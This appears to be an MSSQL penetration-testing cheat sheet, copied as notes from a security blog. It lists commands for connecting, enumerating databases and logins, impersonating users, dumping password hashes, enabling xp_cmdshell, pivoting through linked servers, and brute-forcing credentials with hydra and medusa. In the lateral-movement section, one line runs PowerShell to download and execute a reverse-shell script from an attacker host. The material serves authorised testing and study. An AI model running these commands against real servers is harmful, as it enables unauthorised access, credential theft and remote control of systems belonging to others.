> Notes copied from [routezero.security](https://routezero.security/2025/03/29/mssql-cheat-sheet-for-penetration-testers/)

Microsoft SQL Server (MSSQL) is a common target in penetration testing due to misconfigurations, weak credentials, and privilege escalation opportunities. This cheat sheet provides enumeration techniques, privilege escalation methods, and exploitation tactics useful for pentesters and red teamers.

---

## 1. Connecting to MSSQL

- **Using** `sqsh` **(Linux)**

```
sqsh -S target-ip -U user -P password
```

Connects to an MSSQL server using a specified username and password.

- **Using** `impacket-mssqlclient`

```
python3 mssqlclient.py DOMAIN/user:password@target-ip
```

Connects to MSSQL using Impacket’s `mssqlclient.py`.

- **Using PowerShell (Windows)**

```
sqlcmd -S target-ip -U user -P password
```

Connects using `sqlcmd`.

---

## 2. Enumerating MSSQL

- **Checking MSSQL Version**

```
SELECT @@VERSION;
```

Retrieves MSSQL version information.

- **Listing Databases**

```
SELECT name FROM master.dbo.sysdatabases;
```

Displays all available databases.

- **Listing Tables**

```
SELECT name FROM <database_name>.sys.tables;
```

Lists tables in a specific database.

- **Listing Users**

```
SELECT name FROM master.sys.syslogins;
```

Retrieves all users.

- **Checking Privileges**

```
SELECT is_srvrolemember('sysadmin');
```

Checks if the current user has `sysadmin` privileges.

- **Enumerate local users**
```bash
nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
```

---

## 3. Credential Hunting & Privilege Escalation

- **User Impersonation**

This command verifies whether the current user has permission to perform privilege escalation using the `mssql_priv` module of NetExec.

```bash
nxc mssql <target_ip> -u <user> -p <password> -M mssql_priv --local-auth
```

In the output, it will show us which user can be impersonated if impersonation is possible. Then, to perform the escalation, you can use:

```bash
EXECUTE AS LOGIN = '<target_user>';
```

- **Finding Stored Credentials**

```
SELECT name, password_hash FROM sys.sql_logins;
```

Retrieves stored password hashes (if accessible).

- **Enabling** `xp_cmdshell` **for Command Execution**

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Enables `xp_cmdshell` to execute system commands.

- **Executing System Commands with** `xp_cmdshell`

```
EXEC xp_cmdshell 'whoami';
```

Runs system commands with MSSQL privileges.

---

## 4. Exploiting MSSQL for Lateral Movement

- **Using MSSQL for Reverse Shell**

```
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
```

Executes a PowerShell-based reverse shell.

- **Abusing MSSQL Linked Servers**

```
EXEC sp_linkedservers;
```

Lists linked servers (potential pivoting points).

- **Executing Commands on Linked Servers**

```
EXEC ('whoami') AT linked_server_name;
```

Runs commands on a linked MSSQL server.

---

## 5. Brute-Forcing MSSQL Credentials

- **Using** `hydra`

```
hydra -L users.txt -P passwords.txt mssql://target-ip
```

Attempts brute-force login.

```
medusa -h target-ip -U users.txt -P passwords.txt -M mssql
```

Alternative brute-force attack.